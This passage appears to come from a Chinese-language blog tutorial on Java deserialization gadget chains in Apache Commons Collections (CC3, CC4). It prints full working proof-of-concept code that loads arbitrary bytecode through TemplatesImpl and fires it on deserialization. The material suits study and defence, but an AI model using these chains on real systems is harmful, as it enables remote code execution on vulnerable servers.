class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;CC3.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接把之前的拼起来, 成功执行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519205440576.png" alt="image-20240519205440576"></p><p>当然可以看配合CC6</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;CC3.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比分析Ysoserial</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519225316834.png" alt="image-20240519225316834"></p><p>这里有些许不同, 它使用了<code>InstantiateTransformer</code>而不是<code>InvokerTransformer</code>来调用<code>newTransformer</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519231447711.png" alt="image-20240519231447711"></p><p>可以看见<code>InstantiateTransformer</code>是用来调用构造函数的, 而不是<code>InvokerTransformer</code>那样执行任意方法</p><p>我们再看<code>TrAXFilter</code>这个类, 它的构造函数中正好调用了<code>templates.newTransformer()</code>方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519231136720.png" alt="image-20240519231136720"></p><p>因此即可触发cc3链条</p><p>完整poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>CC4是在CC3的基础上, 前半段不动, 在调用ChainedTransformer的transform方法上有所不同</p><p> 之前的CC1,CC6都是从<code>LazyMap</code>或<code>TransformedMap</code>的get方法去调用transform, 这里CC4使用了其他的链子</p><h2 id="依赖调整"><a href="#依赖调整" class="headerlink" title="依赖调整"></a>依赖调整</h2><p>首先我们需要修改CC4依赖为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>然后在maven中下载依赖的源码, 否则不能调试</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520193836140.png" alt="image-20240520193836140"></p><p>下载好后随便打开一个类看见是.java文件就行了</p><h2 id="链子分析-3"><a href="#链子分析-3" class="headerlink" title="链子分析"></a>链子分析</h2><blockquote><p>因为 CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 不再继承 Serializable，导致无法序列化。<br>同时 CommonsCollections 4的版本 TransformingComparator 继承了 Serializable接口，而CommonsCollections 3里是没有的。这个就提供了一个攻击的路径</p></blockquote><p>先来看看CC4的调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">    PriorityQueue.heapify()  </span></span><br><span class="line"><span class="comment">        PriorityQueue.siftDown()</span></span><br><span class="line"><span class="comment">            PriorityQueue.siftDownUsingComparator()</span></span><br><span class="line"><span class="comment">                TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">                    ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                        InstantiateTransformer.transform()</span></span><br><span class="line"><span class="comment">                            TemplatesImpl.newTransformer()</span></span><br><span class="line"><span class="comment">                                defineClass()-&gt;newInstance()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>CC4依然使用<code>ChainedTransformer</code>, 不同的是谁来调用<code>ChainedTransformer</code>的<code>transform</code></p><p>我们进入<code>TransformingComparator</code>这个类, 可以看见compare方法中调用了transform</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520194949703.png" alt="image-20240520194949694"></p><p>它的构造函数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520195156711.png" alt="image-20240520195156711"></p><p>这使得我们可以调用任意类的transform方法, 再看谁调用了compare</p><p>在PriorityQueue这个类的siftDownUsingComparator中调用了compare</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520200620860.png" alt="image-20240520200620860"></p><p>再看谁调用了siftDownUsingComparator</p><p>答案是siftDown</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520200709787.png" alt="image-20240520200709787"></p><p>继续</p><p><code>heapify</code>调用了siftDown</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520200752572.png" alt="image-20240520200752572"></p><p>正好在这个类的ReadObject方法中调用了heapify</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520200852008.png" alt="image-20240520200852008"></p><p>最终poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> 